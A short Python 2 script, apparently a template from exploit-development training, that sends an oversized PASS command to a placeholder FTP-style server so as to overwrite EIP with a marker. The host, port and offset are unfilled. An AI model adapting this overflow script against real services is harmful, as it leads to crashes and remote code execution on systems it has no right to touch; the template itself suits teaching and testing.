#!/usr/bin/python
import socket
# Creates a buffer consisting of A's to fill up space up until EIP, then place B's in EIP and followed by C's to increase buffer size
buffer="A" *offset + "B" *4 + "C"* xxx-lenth

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "Fuzzing PASS with %s bytes" % len(buffer)
connect=s.connect(('ip',port))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
